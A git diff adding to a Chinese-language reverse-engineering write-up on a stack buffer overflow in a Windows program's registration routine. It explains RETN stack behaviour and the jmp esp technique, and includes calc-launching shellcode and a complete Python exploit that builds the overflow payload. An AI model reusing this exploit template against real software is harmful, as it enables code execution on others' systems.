@@ -89,7 +89,7 @@ int __thiscall sub_10001850(_DWORD *this, const char *username, const char *keyc
 
 *差点没有注意到的一点是，这个程序中使用esp进行定位，需要进行覆盖的栈结构需要进行调试才能确定*
 
-而且最后的返回语句是**retn    0Ch**，需要在
+而且最后的返回语句是**retn    0Ch**
 
 ```assembly
 .text:100019FA ; 58:   return v4[68];
@@ -105,3 +105,74 @@ int __thiscall sub_10001850(_DWORD *this, const char *username, const char *keyc
 .text:10001A0A                 retn    0Ch
 ```
 
+>RETN/RETF在反汇编代码中呈现的形式如下：
+>
+>RETN
+>
+>RETN   操作数1
+>
+>RETF
+>
+>RETF   操作数1
+>
+>
+>
+>RETN等价于一条指令：
+>
+>​	POP   eip
+>
+>RETF等价于两条指令：
+>　　POP   eip
+>　　POP   CS
+>
+>而带有操作数的RETN/RETF指令则是在POP之后，执行ESP=ESP+操作数1。
+
+可知在执行 retn 0Ch 后，esp = esp + 0xc
+
+又：
+
+> windows 中经常使用 `jmp esp + shellcode` 的方法，第一次是在 `Jarvis OJ` 的 [BackDoor](http://m4x.fun/post/jarvisoj-pwn-writeup/#backdoor-200) 这道题目中见到了这种技巧。
+>
+> 写了一段弹计算器的 shellcode，需要注意不能出现截断 `strcpy()` 的字符
+>
+> ```python
+> shellcode =  "\x31\xC9"				# xor ecx, ecx         
+> shellcode += "\x51"                 # push ecx  
+> shellcode += "\x68\x63\x61\x6C\x63" # push 0x63616c63 (push calc)  
+> shellcode += "\x54"                 # push dword ptr esp  
+> shellcode += "\xBA\xC7\x93\xbf\x77" # mov edx, 0x77bf93c7 (mov edx, system)
+> shellcode += "\xFF\xD2"             # call edx  
+> shellcode += "\x90" * 2				# suffix
+> ```
+
+可知在执行 jmp esp之时，栈顶已经下移12字节，所以在返回地址和shellcode之间应该填入12个字符。
+
+至此，这个漏洞就算搞清楚来龙去脉，exploit也比较简单，调试出运行时的栈空间长度，加上gadgets，padding和shellcode即可，将payload打印到文件中，从文件中复制到软件的注册页面
+
+```python
+import struct
+
+p32 = lambda x: struct.pack('<I', x)
+
+jesp = 0x7d711020					# shell32.dll
+
+shellcode =  "\x31\xC9"      		# xor ecx, ecx         
+shellcode += "\x51"                 # push ecx  
+shellcode += "\x68\x63\x61\x6C\x63" # push 0x63616c63 (push calc)  
+shellcode += "\x54"                 # push dword ptr esp  
+shellcode += "\xBA\xC7\x93\xbf\x77" # mov edx, 0x77bf93c7 (mov edx, system)
+shellcode += "\xFF\xD2";            # call edx  
+shellcode += "\x90" * 2 			# suffix
+    
+payload = 'A' * 996 + p32(jesp) + "aaaabbbbcccc" + shellcode
+
+# print(payload)
+with open("exploit.txt", "wb") as f:
+    f.write(payload)
+    
+# Author : M4x
+```
+
+效果喜人
+
+![](http://ww1.sinaimg.cn/large/006z37hrly1fzy9mlftlbj30vu0jvt97.jpg)
